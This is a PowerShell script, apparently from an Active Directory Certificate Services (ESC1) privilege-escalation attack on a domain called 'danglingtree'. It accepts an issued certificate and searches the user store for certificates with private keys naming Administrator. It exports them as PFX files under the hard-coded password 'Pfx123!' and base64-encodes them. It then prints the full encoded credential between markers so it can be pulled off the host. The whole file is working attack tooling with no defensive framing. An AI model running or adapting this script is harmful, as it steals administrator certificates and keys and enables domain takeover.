$ErrorActionPreference = 'Continue'
$dir = 'C:\Windows\Temp\esc1'
$cer = "$dir\admin.cer"
$pfx = "$dir\admin.pfx"
$b64 = "$dir\admin.b64"
$log = "$dir\export.log"
function L($x){ Add-Content $log $x; Write-Output $x }
'' | Set-Content $log

L ("cer=" + (Test-Path $cer) + " size=" + (Get-Item $cer -EA SilentlyContinue).Length)
L (certreq -accept $cer 2>&1 | Out-String)

$pwd = ConvertTo-SecureString -String 'Pfx123!' -Force -AsPlainText
# list all personal certs with private key
$all = Get-ChildItem Cert:\CurrentUser\My -EA SilentlyContinue
L ("store count=" + @($all).Count)
foreach ($c in $all) {
  L ("CERT thumb=$($c.Thumbprint) subj=$($c.Subject) hasKey=$($c.HasPrivateKey) notafter=$($c.NotAfter)")
  try {
    $san = ($c.Extensions | Where-Object { $_.Oid.FriendlyName -eq 'Subject Alternative Name' }).Format(0)
    L ("  SAN=$san")
  } catch {}
}

# Prefer UPN administrator or Subject Administrator
$targets = $all | Where-Object {
  $_.HasPrivateKey -and (
    $_.Subject -match 'Administrator' -or
    (($_.Extensions | ForEach-Object { $_.Format(0) }) -join ' ') -match 'administrator@danglingtree'
  )
}
if (-not $targets) { $targets = $all | Where-Object { $_.HasPrivateKey } }

foreach ($c in $targets) {
  $out = "$dir\$($c.Thumbprint).pfx"
  try {
    Export-PfxCertificate -Cert $c -FilePath $out -Password $pwd -Force | Out-Null
    L ("exported $out size=$((Get-Item $out).Length)")
  } catch { L ("export fail $($c.Thumbprint): $_") }
}

# also try certutil -exportPFX
if ($targets) {
  $t = $targets | Select-Object -First 1
  certutil -exportPFX -p 'Pfx123!' My $t.Thumbprint $pfx 2>&1 | ForEach-Object { L $_ }
}

if (Test-Path $pfx) {
  [IO.File]::WriteAllText($b64, [Convert]::ToBase64String([IO.File]::ReadAllBytes($pfx)))
  L ("b64len=" + (Get-Item $b64).Length)
  # print first 200 chars proof
  L ("b64head=" + (Get-Content $b64 -Raw).Substring(0,[Math]::Min(80,(Get-Item $b64).Length)))
} else {
  # dump any pfx
  Get-ChildItem $dir\*.pfx -EA SilentlyContinue | ForEach-Object {
    $bb = "$dir\$($_.BaseName).b64"
    [IO.File]::WriteAllText($bb, [Convert]::ToBase64String([IO.File]::ReadAllBytes($_.FullName)))
    L ("alt $($_.Name) -> $bb len=$((Get-Item $bb).Length)")
  }
}

# Print full b64 for pull (split lines)
if (Test-Path $b64) {
  L "===B64START==="
  Get-Content $b64 -Raw
  L "===B64END==="
} else {
  $any = Get-ChildItem $dir\*.b64 -EA SilentlyContinue | Select-Object -First 1
  if ($any) {
    L "===B64START==="
    Get-Content $any.FullName -Raw
    L "===B64END==="
  }
}
L "DONE"
Get-Content $log -Raw
